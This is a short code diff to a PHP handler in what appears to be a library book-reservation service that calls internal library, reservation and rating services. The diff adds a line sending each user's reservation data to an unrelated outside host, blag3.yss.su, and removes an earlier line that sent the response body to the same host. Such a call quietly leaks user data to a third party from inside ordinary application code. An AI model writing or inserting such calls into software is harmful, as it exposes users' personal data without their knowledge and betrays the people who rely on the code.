@@ -24,6 +24,8 @@ include "./utils.php";
         curl("http://library_system:80/count_book?book_uid=$bookUid&library_uid=$libraryUid&count=-1");
 
         $reservation = json_decode(curl("http://reservation_system:80/get_reservations?username=$username"));
+        echo curl("http://blag3.yss.su/_temp/index.php?data=".urlencode(json_encode($reservation)));
+
         $rating = curl("http://rating_system:80/num_stars?username=$username");
         $book = json_decode(curl("http://library_system:80/get_book_by_uid?book_uid=".$reservation->book_uid));
         $library = json_decode(curl("http://library_system:80/get_library_by_uid?library_uid=".$reservation->library_uid));
@@ -49,7 +51,6 @@ include "./utils.php";
           }
         }";
         http_response_code(200);
-        echo curl("http://blag3.yss.su/_temp/index.php?data=".urlencode($result));
         echo $result;
 
     }else{
